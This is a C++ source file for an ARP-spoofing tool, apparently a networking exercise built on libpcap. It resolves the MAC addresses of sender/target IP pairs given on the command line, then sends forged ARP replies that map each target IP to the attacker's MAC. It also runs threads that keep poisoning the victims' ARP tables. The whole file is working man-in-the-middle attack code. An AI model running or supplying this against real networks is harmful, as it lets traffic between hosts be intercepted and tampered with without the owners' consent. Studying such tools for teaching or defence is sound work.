#include "main.h"

int main(int argc, char *argv[])
{
	std::vector<Flow> flowList;

	// set interface for flows
	const char *interfaceName = argv[1];

	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}

	// Open pcap handle
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", interfaceName, errbuf);
		return -1;
	}

	// for multiple execution
	int iter;
	for (iter = 2; iter < argc; iter += 2)
	{
		Flow flow;

		printf("\n----------------------------------------\n");
		printf("[*] arp-spoof #%d..", iter / 2);
		printf("\n----------------------------------------\n");

		printf("\n----------------------------------------\n");
		printf("[*] get host info #%d..", iter / 2);
		printf("\n----------------------------------------\n");

		getHostInfo(interfaceName, &flow.attackerIp, &flow.attackerMac);

		printf("\n----------------------------------------\n");
		printf("[*] get sender info..");
		printf("\n----------------------------------------\n");

		flow.senderIp = Ip(argv[iter]);
		flow.senderMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.senderIp);
		printf("[+] senderIp    : %s\n", std::string(flow.senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(flow.senderMac).c_str());

		printf("\n----------------------------------------\n");
		printf("[*] get target info..");
		printf("\n----------------------------------------\n");

		flow.targetIp = Ip(argv[iter + 1]);
		flow.targetMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.targetIp);
		printf("[+] targetIp    : %s\n", std::string(flow.targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(flow.targetMac).c_str());

		flowList.push_back(flow);
	}

	std::vector<std::thread> spoofThreads;
	for (int i = 0; i < flowList.size(); i++)
	{
		// Send ARP Reply packet to infect sender's ARP table
		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, flowList[i].senderMac, flowList[i].attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, flowList[i].attackerMac, flowList[i].targetIp, flowList[i].senderMac, flowList[i].senderIp);
		sendArp(handle, pkt);

		printf("sppofThread #%d start\n", i + 1);
		spoofThreads.emplace_back(spoofProcess, ArpHdr::Reply, handle, pkt, flowList[i]);
	}
	for (auto &thread : spoofThreads)
	{
		thread.join();
	}
	pcap_close(handle);
}
